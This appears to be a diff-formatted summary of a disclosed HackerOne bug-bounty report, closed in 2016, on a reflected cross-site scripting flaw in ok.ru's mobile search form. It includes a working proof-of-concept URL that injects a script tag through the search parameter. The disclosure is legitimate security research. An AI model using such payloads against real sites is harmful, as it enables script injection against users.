@@ -1,0 +1,12 @@
+ReportLink:https://hackerone.com/reports/137126
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/hamooda_anonphantom
+ReportedTo:ok.ru(ok)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:04.10.2016 21:17:32
+
+Summary:
+XSS in mobile search form
+m.ok.ru/dk?st.cmd=faq&st.search=1_</script><script>prompt(1337)</script>&_prevCmd=faq&tkn=7845 
